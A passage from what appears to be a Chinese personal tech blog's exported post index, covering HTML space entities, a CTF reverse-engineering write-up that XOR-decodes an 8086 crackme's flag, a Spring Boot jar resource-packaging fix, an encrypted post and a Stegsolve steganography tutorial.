<p>有多种字符实体可以让浏览器显示空格。&amp;ensp；(这里为了防止&amp;ensp；被转化为空格  &ensp;&ensp;;我改为了；,下文同)<br> — “en空格”是根据字体排印学的计量单位命名，宽度是两个普通空格的宽度，&amp;emsp； — “em空格”大概是四个普通空格的宽度。<br>可以用这个代码实现缩进。</p>
]]></content>
      <tags>
        <tag>小知识点</tag>
      </tags>
  </entry>
  <entry>
    <title>re学习笔记(1)--[BJDCTF 2nd]8086</title>
    <url>/article/65c9acdf.html</url>
    <content><![CDATA[<p>今天刚好打完省赛，两道re题，只做出来一道，，，希望下次能够尽量都做出来。在吾爱破解上面看到有人一天写一篇关于re题的wp，已经连续记录了有一百多天了。我觉的这样很好，为了防止我可能会懈怠，这里也想模仿一下记录一下自己学习过程，正好省赛结束了，从今天开始，一天一道，到明年省赛应该就将近一年了。<br>大概学习逆向应该有三十天了，其实是不止的，从暑假我就开始学习逆向了，但是正式做CTF题应该是最近一个月开始的，所以就按照三十天算的。想想我成为reverse大师的那一天，，啧啧。</p>
<p>从BUUCTF开始</p>
<p>================================</p>
<a id="more"></a>

<h2 id="0x01-查壳和详细信息"><a href="#0x01-查壳和详细信息" class="headerlink" title="0x01 查壳和详细信息"></a>0x01 查壳和详细信息</h2><p>.exe文件，第一想到的就是先运行一下，没想到失败了。</p>
<img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-1.png" srcset="/img/loading.gif" alt="1" />

<p>用Exeinfo打开，查看一下信息吧</p>
 <img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-2.png" srcset="/img/loading.gif"  alt="1" />

<p> 这个我是真没看到过。。。试了一下，OD无法识别，IDA无法完成反编译（一开始我的理解），就连查壳软件都不觉得他是一个PE文件。</p>
<h2 id="0x02-分析文件"><a href="#0x02-分析文件" class="headerlink" title="0x02 分析文件"></a>0x02 分析文件</h2><p>用ida打开之后，发现只有两个函数sub_10030和start</p>
<p>看了一下sub_10030函数，死循环</p>
<img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-3.png" srcset="/img/loading.gif" alt="1" />

<p>查看完汇编后，这时直接就没有什么想法了，看了看题目，8086，估计有点关系，猜测可能和处理器类型有关系。(最后发现其实正常打开也一样)</p>
<img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-4.png" srcset="/img/loading.gif" alt="1">

<p>8086第一个反应应该都是80x86，而在汇编语言中有种汇编，是十分基础的，被当作示例给大家讲的汇编语言，就是8086汇编。今天早上的微机原理接口第一节课上，满屏幕的都是8086，整本书应该都与这个神奇的东西有关。上网查了一下，8086汇编的程序通常是一个16位的程序，这就是为什么OD认不出来了。(<a href="https://ljzjsc.com/index.php/archives/34/" target="_blank" rel="noopener"> BUUCTF [BJDCTF 2nd]8086</a>)</p>
<p>看一下汇编</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">dseg:0000 ; ===========================================================================<br>dseg:0000<br>dseg:0000 ; Segment type: Pure data<br>dseg:0000 dseg            segment para stack 'DATA'<br>dseg:0000                 assume cs:dseg<br>dseg:0000 aUDuTZWjQGjzZWz db ']U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;',0<br>dseg:0023                 align 10h<br>dseg:0023 dseg            ends<br>dseg:0023<br></code></pre></div></td></tr></table></figure>
<p>第一段数据段是将这串字符串写入物理地址，并取名aUDuTZWjQGjzZWz。</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">seg001:0000 ; ===========================================================================<br>seg001:0000<br>seg001:0000 ; Segment type: Pure code<br>seg001:0000 seg001          segment byte public 'CODE'<br>seg001:0000                 assume cs:seg001<br>seg001:0000                 assume es:nothing, ss:nothing, ds:dseg<br>seg001:0000<br>seg001:0000 ; =============== S U B R O U T I N E =======================================<br>seg001:0000<br>seg001:0000 ; Attributes: noreturn<br>seg001:0000<br>seg001:0000 sub_10030       proc near               ; CODE XREF: sub_10030↓j<br>seg001:0000                                         ; start+5↓p<br>seg001:0000                 jmp     short sub_10030<br>seg001:0000 sub_10030       endp<br>seg001:0000<br>seg001:0000 ; ---------------------------------------------------------------------------<br>seg001:0002                 db 0B9h, 22h, 0, 8Dh, 1Eh, 2 dup(0), 8Bh, 0F9h, 4Fh, 80h<br>seg001:0002                 db 31h, 1Fh, 0E2h, 0F8h, 8Dh, 16h, 2 dup(0), 0B4h, 9, 0CDh<br>seg001:0002                 db 21h, 0C3h<br>seg001:001A                 assume ss:dseg, ds:nothing<br>seg001:001A<br>seg001:001A ; =============== S U B R O U T I N E =======================================<br>seg001:001A<br>seg001:001A ; Attributes: noreturn<br>seg001:001A<br>seg001:001A                 public start<br>seg001:001A start           proc near<br>seg001:001A                 mov     ax, seg dseg<br>seg001:001D                 mov     ds, ax<br>seg001:001F                 assume ds:dseg<br>seg001:001F                 call    sub_10030<br>seg001:001F start           endp<br>seg001:001F<br>seg001:001F ; ---------------------------------------------------------------------------<br>seg001:0022                 db 0B4h, 4Ch, 0CDh, 21h<br>seg001:0022 seg001          ends<br>seg001:0022<br>seg001:0022<br>seg001:0022                 end start<br></code></pre></div></td></tr></table></figure>

<p>之后真的不知道怎么做了，和我一起遇到的题目都不一样。。。<br>后来看了wp，果然是我的盲区。<br>问题出现在这里</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">seg001:<span class="hljs-number">0000</span> ; ---------------------------------------------------------------------------<br>seg001:<span class="hljs-number">0002</span>                 db <span class="hljs-number">0B</span>9h, <span class="hljs-number">22</span>h, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>Dh, <span class="hljs-number">1</span>Eh, <span class="hljs-number">2</span> dup(<span class="hljs-number">0</span>), <span class="hljs-number">8B</span>h, <span class="hljs-number">0F</span>9h, <span class="hljs-number">4F</span>h, <span class="hljs-number">80</span>h<br>seg001:<span class="hljs-number">0002</span>                 db <span class="hljs-number">31</span>h, <span class="hljs-number">1F</span>h, <span class="hljs-number">0E2</span>h, <span class="hljs-number">0F</span>8h, <span class="hljs-number">8</span>Dh, <span class="hljs-number">16</span>h, <span class="hljs-number">2</span> dup(<span class="hljs-number">0</span>), <span class="hljs-number">0B</span>4h, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>CDh<br>seg001:<span class="hljs-number">0002</span>                 db <span class="hljs-number">21</span>h, <span class="hljs-number">0</span>C3h<br>seg001:<span class="hljs-number">001</span>A                 assume ss:dseg, ds:nothing<br>seg001:<span class="hljs-number">001</span>A<br>seg001:<span class="hljs-number">001</span>A ; =============== S U B R O U T I N E =======================================<br></code></pre></div></td></tr></table></figure>

<p>这一段是代码段，就是刚才的死循环段。但是后面还有一串数据，估计就是真正的代码。选中，按C，选force，强制转换成汇编。(确实不知道。。。)</p>
<img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-5.png" srcset="/img/loading.gif" alt="1">

<p>强制转换之后就是这样的</p>
<img src="https://qiniuyun.fxhstudy.com/%5BBJDCTF%202nd%5D8086-6.png" srcset="/img/loading.gif" alt="1">

<p>真的神奇，以前还真没有遇到这样的，还是做少了。。。</p>
<p>分析一下大概意思就是循环0x22次，将 <code>aUDuTZWjQGjzZWz</code> 进行与 <code>0x1F</code> 异或操作,就结束了。<br>理解不是很难，但是将代码段强制转换成汇编这个知识点我是真的不知道。</p>
<h2 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">Value = <span class="hljs-string">']U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b'</span><br>flag = <span class="hljs-string">''</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Value:<br>	flag += chr(ord(i) ^ <span class="hljs-number">0x1F</span>)<br><br>print(flag)<br></code></pre></div></td></tr></table></figure>



<p>===============================<br>参考文章：<br>    <a href="https://blog.csdn.net/qq_44625297/article/details/105158182" target="_blank" rel="noopener"> buucf - re - [BJDCTF 2nd]8086</a></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot+thymeleaf打包成jar后找不到静态资源的坑[转]</title>
    <url>/article/931cd52f.html</url>
    <content><![CDATA[<blockquote>
    原文链接:<a href="https://juejin.cn/post/6896312475390574599" target="_blank" rel="noopener">https://juejin.cn/post/6896312475390574599</a>
</blockquote>
<br>


<p>这是我最近在做项目的时候遇到的问题，觉得可以记录下来，以后写的时候可以注意,这篇文章是转自CSDN的，这里源地址链接已经放到上面了。</p>
<h3 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h3><p><font color="#856363" size="4" face="Open Sans"><b>使用的springboot开发项目，在开发阶段没有任何问题，然而在打成jar包准备进行测试发布时，出现org.thymeleaf.exceptions.TemplateInputException:Error resolving template [login], template might not exist or might not be accessible by any of the configured Template Resolvers</p>
<p>首页都进不去。</p>
<p>网上逛了一圈，大多数都是说controller在return的时候去掉前面的斜杠，即：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span>(<span class="hljs-string">"/index"</span>)<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">index</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"/index"</span>; <br>    <span class="hljs-comment">//把"/index" 变成"index"</span><br>    <span class="hljs-comment">//如 return "index"</span><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>先不说这样并不可行，就算可以，上百个controller难道要一个一个改？果断放弃这条思路。<br></b><br></font></p>
<h3 id="解决思路及最终解决步骤："><a href="#解决思路及最终解决步骤：" class="headerlink" title="解决思路及最终解决步骤："></a>解决思路及最终解决步骤：</h3><p>从错误信息上看，很明显是找不到对应的html文件，先来看一下我的项目文件目录结构：</p>
<p><img src="https://img-blog.csdnimg.cn/20190409202443567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTQ2ODExMg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif"><br></p>
<p><font color="#856363" size="4" face="Open Sans"><b>这里就要批评一下自己了，这个webapp是我自己加上的，你问我为什么？因为之前springMvc的结构就是这样的。。。。</p>
<p>这就是读书读一半的恶果了，同学们要引以为戒啊。</p>
<p>然后看一下yml文件的配置：</p>
<p><img src="https://img-blog.csdnimg.cn/20190409202725708.png" srcset="/img/loading.gif"><br></p>
<p>这里主要是配置springmvc支持的，手动加上前面的webapp目录，把静态资源往上一放，在yml再配置一下springmvc支持，项目运行起来那是一点问题都没有，假如后面项目打包成war包，一样可以完美运行。然而。。。。</p>
<p>当我打包成jar包后，完全没办法运行啊。。。。</p>
<p>然后我用winrar打开jar包，想看看我的文件都去哪了。。。。</p>
<p><img src="https://img-blog.csdnimg.cn/20190409203055806.png" srcset="/img/loading.gif"><br><br>这个是jar包打开最外层，再往下找，看看boot-inf里面有什么<br><br><img src="https://img-blog.csdnimg.cn/2019040920323850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTQ2ODExMg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif"><br><br>我的静态资源文件去哪啦？？？</p>
<p>正常的目录结构应该是这样的（以tomcat为例）：<br><img src="https://img-blog.csdnimg.cn/20190409203438976.png" srcset="/img/loading.gif"><br></p>
<p>这说明我的webapp下面的文件一个也没有编译进jar包里，能找到文件才怪了。。。</p>
<p>知道了问题所在，那剩下来的就是如何解决掉这个问题了</p>
<p>springboot有说明：所有的静态文件都应该放在static、templates或者resources下（我怎么好像记得是4个？？？）。</p>
<p>个人比较喜欢resources，所以就先新建了一个resources文件夹，然后把所有的资源文件都放到了resources文件夹下面：</p>
<p><img src="https://img-blog.csdnimg.cn/20190409203952236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTQ2ODExMg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif"><br></p>
<p>文件移动过来后，再重新编译，然后再去找，终于找到了这些可爱的文件：</p>
<p><img src="https://img-blog.csdnimg.cn/20190409204111888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTQ2ODExMg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif"><br></p>
<p>最后一步：配置springMvc的前后缀：</p>
<p><img src="https://img-blog.csdnimg.cn/20190409204350815.png" srcset="/img/loading.gif"><br></p>
<p>这里注意一下最后的斜杠不能少。</p>
<p>重新编译后，终于可以正常运行起来。</p>
</b>
</font>

]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>一些小东西</title>
    <url>/article/88de85c9.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c4fcc878c427d19fb6cb7c23ce7e9c08480f1c681410a71972cf254a284f8e32">d8cd019511c7f3543a104e8f05f74c583d90ab80bb96d1b4fb6600fafc197cb7aa238994b1b729f5122a18e909c5215b47177b1bc89012c095dc3b5d5d7125842b6db3e3a14d190265299d0dddddc05c2b41860817c30148119d2718b10626e7d902366afd31b6fcc9fb4560abcec5e7210b880f8e0815e15ffc0e279dd61e4cf403fee6ca732d3f283d96c9b984b7e6d6f394048bdf65c7aff489c810f0f42ae420ee966c375638525422c8a628f7c13499eac3c27a85245215cad8b8ca55055c4a9bad3d4a7429a373a3c7e2ec103add69ea557208dac88395894cb07d6bf59d7bc01c01a0764b90a745bddba4d4d8205db8e7d679fd451f6133d3a10de1c6bbfd06c1a61ccfb0ce4e475a467519e11c8cc8252b3fd60ab8ef3909441d6a02ad75d03fc94bd9bc291a43aba05a33bafb7093f45072881aa235dea2d954e94c84f817a6f230b568c3fdd746a95acb862c404dea48ccca813dd4a5bdb2db212137b396977c3430e47ace74090502d000876ac0cbfc819f8a3e763eaccd45ed222b7ba52c75042c26160e3bb79e2c97a573543b76e103015296cb2b5ed3b78034000f42c29bc8772cdf437948194c2b3cbe57106dca4f078ca319327341b58438637b5c71e8de40aaf3c8a604962db946ae753279f8af9a8e69560c79b97495dd189dd80c40e6a2cb9f7020bb0893fe2bd8bd8dd5033549e0519832a1c923dc32c7b5e40da6d0f49a95d12cf0401da4debd176da73c80dfa6f1e8b43412d1e9377584e5bbdd86468d3af00474acb4d21a2a70eef148ee8f3ba6465c1e0e72d2cb20cc8d795c1727c06ab7710c418ab009c4392ba4cbc809454d7ff3225d00da0fc0862b636b80765c32d8519cd442042458c3cc43bf6bd6b8736143d7eb6eff45adb8f02f6119fdf8623e68f47077af9bac27fedfb6970e276eea057f1550ea508c0a325159e98e326c3d3a53c7506b1a1ef4c7293a4a2218d9098c033196c1a4c86c4b162dae94cb21f8bb60bbabfe0ab249b86df8edeab04169b6c64b64bdcba314b0db2018293c9dd95887d3c0fe2c68a9d5a9ca391216acade47d6d8dc282c78521a68007e7cca417e1d592b22ac44ece0d0d45e598611df55e9b08957e04bbc71ed1aabcf44eddb9d2323285556d802c683a2f720409c5ec811eac6d847f7bb6dfd0b37d04484c787aa50b00813a0eb5c9846b7c15f7c87b156109a4344bd2ab282570bde5b454de469973643b2162d3568bce753d964cff6a8e049744d4b6b0b70f466fe67e4290d3719a23f4570edd28b5b7b05bfaa665c2366ce7c78dcd8f8d06fc87bfa232cf6d69535e82a26889c19fe11aa7c931846d544902abaa52371cf50849ca6cd12120bd76f1cd1b721d7d5418c14044a45901eb6b6ab84352c1128068196acc8da0cb67b702351e949925362818d44c5697ff8bf2394783f976a430f191030885c666974f008bacf7a4729e470f23c8ee7ca07195ffdc922d2def6502433c59502cb4d4c3e9384854aa4e35cd1a14bf3dd5f1ff15cfa41ae93ea263e69f07b0b7580881af15d436c17d820822dd74a5888e969587e72fefeaefc36e0e31603b55cc4a75586265f7f2671df4516adb48bc11e2b1d88d8f50e2c88c7e166bba9f9fd21ac6d33f7619eb336a52ae9a3e04b61aec15119704c332d76c92cf5a8418276e903484bd6a75bc0a4b6d48fbf7cda2c27c1242ef2ce5fee67e24f56190401e4e6fefdedb13b6bd228f10ab14575122618194f519ee08d5db51d26b3db926411d26a2b437f4992d6ad9f16673d10111aeb4790c3caaadba54c733a800bc042d404862752d784cd58307e2c34f3c364ec8108b1e0b0a6a73be0d4fc07f78dcf03cda486238b39242d0962d262a1f13039bd5d46eaf69e6571b7ad64059bd60749fd352c6ec2a6f65a73041d3f913803f332edfdab4a98dcc09b7b0ceb80c1f3d1f110b0fd144f13f1ba46f9da5f62611622973bc84d83f8c516145086222ca03840788736fa87e9395fbf7f8a0cb457aefda0ab80170b5e51e1c1d229b6ea32abf68cf92499ea57c85de3d07e75dd97c326c5578b3750ff2a7470c946dbfe8651bf2be3e56fb599fc186a3a389e54c7310060f23bc66abe0dd66b9872e2fd84b2698abe522d2830596b1fc73479449da220452c6c24b4884df0ea20b33c87a8f3e1ebbc5414baaae835c5a48426c7df6ec90a2fcd13f72d1ad3624d709fe26659cca3a1f10e7a4faaeb6e41c9b267354dfa54b1bc329def70c0ef6fc0de42511eddd332b5b4e8989ff04214800b5633871a5db559b019b04fc14bd3023dfdc93d030ba5523482864083f0e05807922aa3b5f7c92228efc65028ab0e3ce3f4ee9804ce7e237392c0bf9de500a79f7c6b6f673f37480a2119e9e0c62f9dbf8bbbde4675dac28db07f86b0aacf7eaac13a54212bdb7911fd3f8ec399908d74793c3a574277de3cf5fbb3a489a6b02815792801be5fab83a7e26e6611fb78caa44fdc0f247ea2c4099328277c5df6880f0157e171349e39829ad7a71907d3d3812504d49fef011b2b974dfc3bb3bf7d1bb9e5735c5dbb531d86b4bf2bdfd2205b9b3f63864e47dc2e9c91f1d34eb5b8bb52f0b7e079319c8c1927197521cd37ed99abab49ec61f61bd4f9a6f42333e5b327923ae2d857dab1c8651660a837fb1cc63adb24d2007b0ae7a41f9376d9eeb9621875d57af8518f45c756757f7c84881f043238a13ef0515152f23e030bf5cc0e9205f93dee382723e86a6a7ed744684ff1d13b7e258196ab0cb434a6aaed5d8040d17109c94ab7d83b6e67848886ce089ada873198af46a72c0beabef365b61863f9356ac79903d6b2a1ae918d07d5980ebb66c83d348b62a8e558023389c97eacfaff593d5e8415d065b5edccfdaeb8f258289f3af64c6d81a452c8f38b5c19b010f69559b319b5c498035f6129c3cd016aa7c34d2a3452c402ecfdf2e42a597bb29e17c9c77c1d7b3df0f1ec2b021fd21d56dce2c2680ff7f449c7160540a7eefc7d000812b5021532f8e52e684551134f0958614ac0f46b506de8d79ae4dfb64d244c1657a0a9535b773ac9c718fbe7d8a9b888dc9bc14bc2d649f461ac1c922cb2818f73fade64a36e8193f69837dc6ac7a18ef94f52d873b2e51630e4709ebd3d68f2649d6698ecc035881a64e41d785461797ab27ad95e91d6bce2643b607cf59fc42a1db0ca4c111312a697790e806509119426b06727c1bd06044d369c3d9c020bc86f18f28faf9c6c754084e3bd6a96412474149ba0cd6ef869d53999859d13abf4747fb6845bf52337e71cb1c48efcc4287663d4d697cb6834f09d53d06525ecd330e99c1d5240a1030bc183315747401156f5daa6b21383a72f4f1dc8699f160a8f44e347a5af3b8148f3c5e307f3fecc44e6c40b29fda108cf34d514baf467ce1407a9ef274a7ba79b802a3d5d686c340d1ff880e115450aaaeb640d47b6e71ced25a4c0a7b595db6dfe4809fa90fc5784a07da325bef977fac17d6fa5d627eee62cf836af59a70d65195cddd49e9fa1d1dbce0b0fe997d56c624a08dda004363683b265b30e63cc59814106c2b613a5d8f6ede11df421c72028b3f1de1de2cf06b2e352de2ad6ca6cacf09f00082dc3521077c2eb3ff6dccd6731a68d66e980133879d219eb7510d9597e6c4d9ded8e9bf415e977fabd6087c8a8a719005513942a6e8947234aeb46bc5a0ac932143cb3121a5c9c058ed3f2278d1641b2a59401b4bb2d39d61905d73dfd595addb0345fc</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>小知识点</tag>
      </tags>
  </entry>
  <entry>
    <title>stegsolve使用方法</title>
    <url>/article/7b4f5797.html</url>
    <content><![CDATA[<blockquote>
    原文链接:<a href="https://www.cnblogs.com/cat47/p/11483478.html" target="_blank" rel="noopener">https://www.cnblogs.com/cat47/p/11483478.html</a>
</blockquote>
<br>

<p>Stegsolve这个工具可以说可以解决很多图片的隐写（有很大一部分隐写和图片有关），所以会经常在CTF中遇到它，<br>但是网上对于Stegsolve这个工具的使用说明并不多，这里转载一位大佬对这个工具的详细使用，可以避免自己不必要的瞎摸索。</p>
<p>Stegsolve使用方法（是因为ctf题总是遇到并且目前百度没有十分详细的探究说明）</p>
 <img src="https://qiniuyun1.fxhstudy.com/stegsolve%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%951.png?e=1599621106&token=VFssMO7WeG2pXy5pvv-XCktbIAWrTzD21WtoGgks:1bsLrDgIUyrVOYjiw5DSEYWLTtM=" srcset="/img/loading.gif"  alt="1" />

<p> 这个没什么好说的，打开文件 ，保存，退出</p>
<a id="more"></a>

 <img src="https://qiniuyun1.fxhstudy.com/stegsolve%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%952.png?e=1599621106&token=VFssMO7WeG2pXy5pvv-XCktbIAWrTzD21WtoGgks:3ZxAuv4Fqy_YWMi3Cy4XeCsByrw=" srcset="/img/loading.gif"  alt="1" />

<p> 在分析里面从上到下的依次意思是</p>
<p>File Format:文件格式</p>
<p>Data Extract:数据提取</p>
<p>Steregram Solve:立体试图 可以左右控制偏移</p>
<p>Frame Browser:帧浏览器</p>
<p>Image Combiner:拼图，图片拼接</p>
<p>用法（使用场景）</p>
<p>1.File Format:这里你会看见图片的具体信息有时候有些图片隐写的flag会藏在这里</p>
<p>2.Data Extract:(好多涉及到数据提取的时候，很多博主在wp中都是一带而过，小白们还以为要一个个试。。)</p>
 <img src="https://qiniuyun1.fxhstudy.com/stegsolve%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%953.png?e=1599621106&token=VFssMO7WeG2pXy5pvv-XCktbIAWrTzD21WtoGgks:2Ta2y-qajt7t1KtYnHBzMU57DaE=" srcset="/img/loading.gif"  alt="1" />

<p> 左边一大部分主要是讲了RGBA（Alpha是透明度）的颜色通道</p>
<p>为了方便理解我们分开说</p>
<p>RGB是红绿蓝 但他们的值代表的实际上是亮度</p>
<p>R的数字越大，则代表红色亮度越高；R的数字越小，则代表红色亮度越低。G，B同理</p>
<p>R的亮度各有256个级别，GB同理。即从0到255，合计为256个。从数字0到255的逐渐增高，我们人眼观察到的就是亮度越来越大，红色、绿色或蓝色越来越亮。然而256是2的8次方 所以你会看见上图的7~0  一共8个通道</p>
<p>而Alpha就是透明度 该通道用256级灰度来记录图像中的透明度信息，定义透明、不透明和半透明区域</p>
<p>alpha的值为0就是全透明，alpha 的值为 255 则表示不透明</p>
<p>因此左半部分就理解了</p>
<p>右半部分就是Extra By(额外的)和Bit Order（位顺序）和Bit Plane Order（位平面的顺序）</p>
<p>1）.Extra By(额外的)：分为row（行）和column（纵）</p>
<p>   每个像素用R，G，B三个分量表示，那么一张图片就像一个矩阵，矩阵的每个单位就是（0<del>255，0</del>255，0~255）</p>
<p>   也就会有是纵排列和行排列了，一般事先访问行再访问列（如果相反会引起ve使用方法）</p>
<p>2）.Bit Order（位顺序）:MSB是一串数据的最高位，LSB是一串数据的最低位。</p>
<p>3）.Bit Plane Order（位平面的顺序)</p>
<p>&emsp;&emsp;整个图像分解为8个位平面，从LSB(最低有效位0)到MSB（最高有效位7）随着从位平面0 到位平面7，位平面图像的特征逐渐变得复杂，细节不断增加。（一般我们的图片如果是RGB那么就是24位 3乘8嘛）</p>
<p>4）Bit Plane Order（位平面的顺序）:一般图片是24位 也就是3个8 大家可以想像成三明治 比如BGR就是B为三明治第一层 G为第二层 R为第三层。</p>
<p>3.Steregram Solve:立体试图 可以左右控制偏移 可以放张图片试一下就知道这个是什么意思了</p>
<p>4.Frame Browser:帧浏览器   主要是对GIF之类的动图进行分解，把动图一帧帧的放，有时候会是二维码</p>
<p>5.Image Combiner:拼图，图片拼接（意思显而易见）</p>
<p>接下来会带大家实战去深入理解一下Data Extract里面ctf经常用到的LSB隐写</p>
 <img src="https://qiniuyun1.fxhstudy.com/stegsolve%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%954.png?e=1599621106&token=VFssMO7WeG2pXy5pvv-XCktbIAWrTzD21WtoGgks:ROesfswMlPvklSDLY2hSyC6FK2U=" srcset="/img/loading.gif"  alt="1" />

<p> 这个我们之前介绍的很详细<br>而LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，（人类的眼睛只能识别一部分颜色的变化）</p>
 <img src="https://qiniuyun1.fxhstudy.com/stegsolve%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%955.png?e=1599621106&token=VFssMO7WeG2pXy5pvv-XCktbIAWrTzD21WtoGgks:e1em-8Pa5hIDrQIhnWuV0EXgLy4=" srcset="/img/loading.gif"  alt="1" />

<p> 如果我们修改lsb那么颜色依然和没修改的一样，并且修改的话每个像数可以携带3比特的信息。</p>
  <img src="https://qiniuyun1.fxhstudy.com/stegsolve%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%956.png?e=1599621106&token=VFssMO7WeG2pXy5pvv-XCktbIAWrTzD21WtoGgks:amTB5Meyr7wLXAWqLT2ajDMzKWo=" srcset="/img/loading.gif"  alt="1" />

<p> 这个作用是在于把最低位的二进制全部提取出来</p>
  <img src="https://qiniuyun1.fxhstudy.com/stegsolve%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%957.png?e=1599621106&token=VFssMO7WeG2pXy5pvv-XCktbIAWrTzD21WtoGgks:AUm4LsIlYgVWsdiIXr8yWgolnr0=" srcset="/img/loading.gif"  alt="1" />

<p>这个作用在于对提取出来的最低位使用lsb解码算法</p>
 <img src="https://qiniuyun1.fxhstudy.com/stegsolve%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%958.png?e=1599621106&token=VFssMO7WeG2pXy5pvv-XCktbIAWrTzD21WtoGgks:v88Sixs-PHULog7EFhcYdFVDwkc=" srcset="/img/loading.gif"  alt="1" />
]]></content>
      <categories>
        <category>工具</category>
